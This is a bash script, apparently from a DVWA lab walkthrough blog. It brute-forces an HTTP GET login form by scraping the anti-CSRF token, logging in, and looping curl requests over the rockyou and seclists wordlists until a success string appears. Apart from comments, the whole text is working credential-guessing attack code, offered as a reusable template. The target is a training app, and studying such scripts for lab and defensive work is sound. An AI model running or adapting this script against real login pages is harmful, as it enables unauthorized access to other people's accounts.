#!/bin/bash
# Quick PoC template for HTTP GET form brute force
# Target: DVWA v1.10 (Brute Force - Low)
#   Date: 2015-10-25
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/bruteforce-low/

## Variables
URL="http://192.168.1.44/DVWA"
DVWA_USER="admin"
DVWA_PASS="password"
USER_LIST="/usr/share/seclists/Usernames/top_shortlist.txt"
PASS_LIST="/usr/share/seclists/Passwords/rockyou.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Welcome to the password protected area"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
sed -i '/security/d' /tmp/dvwa.cookie

## Login to DVWA core
curl -s -b /tmp/dvwa.cookie -d "username=${DVWA_USER}&password=${DVWA_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" >/dev/null
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

    ## Feedback for user
    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## Connect to server
    REQUEST="$( curl -s -b 'security=low' -b /tmp/dvwa.cookie "${URL}/vulnerabilities/brute/?username=${_USER}&password=${_PASS}&Login=Login" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] Found!"
      echo "[i] Username: ${_USER}"
      echo "[i] Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie
